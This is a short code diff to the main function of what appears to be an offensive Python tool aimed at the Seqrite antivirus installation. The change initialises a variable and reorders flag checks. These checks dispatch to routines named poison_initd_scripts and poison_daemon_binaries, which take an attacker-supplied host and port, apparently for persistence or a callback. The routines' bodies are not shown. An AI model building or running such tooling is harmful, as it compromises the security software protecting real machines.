@@ -263,6 +263,7 @@ def main():
         parser.print_help()
         quit()
 
+    inputx = 0
     if not args.init and not args.ob:
         print('[-] No technique flag used, switching to interactive.')
         inputx = print_choice()
@@ -271,12 +272,12 @@ def main():
         print('[-] Failed to find Seqrite installation directory. Aborting...')
         quit()
 
-    if inputx == '1' or args.init:
+    if args.init or inputx == '1':
         poison_initd_scripts(
             host=args.hostport.split(':')[0],
             port=args.hostport.split(':')[1]
         )
-    elif inputx == '2' or args.ob:
+    elif args.ob or inputx == '2':
         poison_daemon_binaries(
             host=args.hostport.split(':')[0],
             port=args.hostport.split(':')[1]
